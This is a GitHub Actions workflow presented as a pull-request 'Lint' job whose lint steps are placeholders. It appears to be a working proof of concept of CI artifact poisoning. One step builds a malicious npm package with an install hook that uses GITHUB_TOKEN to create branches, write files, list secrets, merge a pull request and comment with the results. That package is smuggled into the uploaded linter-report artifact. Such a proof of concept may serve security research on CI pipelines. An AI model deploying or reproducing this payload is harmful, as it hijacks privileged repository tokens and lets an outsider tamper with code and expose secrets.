---
name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Lint
        id: lint
        continue-on-error: true
        run: echo "lint placeholder"

      - name: Save PR number
        if: always()
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: echo "$PR_NUMBER" > pr-number.txt

      - name: Generate linter report
        if: always()
        run: echo "No issues found." > linter-report.txt

      - name: Attacker payload for the trusted linter-report artifact
        if: always()
        run: |
          mkdir -p pkg/package
          cat > pkg/package/package.json <<'JSON'
          {
            "name": "pwn",
            "version": "1.0.0",
            "scripts": {
              "install": "node index.js"
            }
          }
          JSON
          cat > pkg/package/index.js <<'JS'
          const fs = require('node:fs');
          const path = require('node:path');
          const base = process.env.INIT_CWD || process.cwd();
          let pr = '1';
          try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
          const repo = process.env.GITHUB_REPOSITORY;
          const token = process.env.GITHUB_TOKEN;
          async function api(method, url, body) {
            const r = await fetch('https://api.github.com/repos/' + repo + url, {
              method,
              headers: { authorization: `Bearer ${token}`, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
              body: body ? JSON.stringify(body) : undefined
            });
            return r.status + ' ' + (await r.text()).slice(0, 200);
          }
          (async () => {
            const probes = {};
            probes.git_ref_create = await api('POST', '/git/refs', { ref: 'refs/heads/pwn-branch', sha: process.env.GITHUB_SHA });
            probes.contents_write = await api('PUT', '/contents/pwn.txt', { message: 'x', content: 'aGk=' });
            probes.list_secrets = await api('GET', '/actions/secrets');
            probes.merge_pr2 = await api('PUT', '/pulls/2/merge', { merge_method: 'squash' });
            probes.comment = await api('POST', '/issues/' + pr + '/comments', { body: '## Privileged token capability probe\n\n```\n' + Object.entries(probes).filter(([k]) => k !== 'comment').map(([k, v]) => k + ': ' + v).join('\n') + '\n```' });
            console.log(JSON.stringify(probes, null, 1));
          })().catch((e) => { console.error('probe failed:', e && e.message); });
          JS
          tar -czf pwn-1.0.0.tgz -C pkg package
          cat > package.json <<'JSON'
          {
            "name": "artifact-payload-root",
            "version": "1.0.0",
            "private": true,
            "dependencies": {
              "pwn": "file:./pwn-1.0.0.tgz"
            }
          }
          JSON

      - name: Upload linter report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            package.json
            pwn-1.0.0.tgz
          if-no-files-found: ignore
